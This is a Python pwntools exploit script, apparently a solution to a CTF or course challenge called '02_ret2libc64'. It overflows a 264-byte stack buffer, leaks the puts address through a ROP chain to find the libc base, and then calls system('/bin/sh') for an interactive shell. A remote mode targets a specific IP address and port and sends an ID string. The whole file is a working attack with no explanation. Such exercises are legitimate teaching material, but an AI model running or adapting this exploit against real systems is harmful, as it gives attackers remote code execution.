from pwn import *

context.log_level = 'DEBUG'

local = True

if local:
    elf = ELF('./02_ret2libc64_new')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = elf.process()
    puts_got = elf.got['puts']
else:
    elf = ELF('./02_ret2libc64')
    libc = ELF('libc-2.27.so')
    p = remote("47.99.80.189", 10012)
    p.recvuntil('ID:')
    p.sendline('3180103650')
    puts_got = 0x601018
    

p.recvuntil('ID:')
p.sendline('3180103650')

puts_plt = elf.plt['puts']
pop_rdi = 0x0000000000401373
ret = 0x000000000040101a
main = elf.symbols['main']
hear = elf.symbols['hear']

payload1 = 'A'*(256+8)
payload1 += p64(ret)
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(hear)

p.recvuntil('me!')
p.sendline(payload1)

p.recvuntil('\n')
leak = u64(p.recvline(6).strip('\n').ljust(8, '\x00'))

libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('bin_sh: ' + hex(bin_sh))


payload2 = 'A'*(256+8)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)

p.interactive()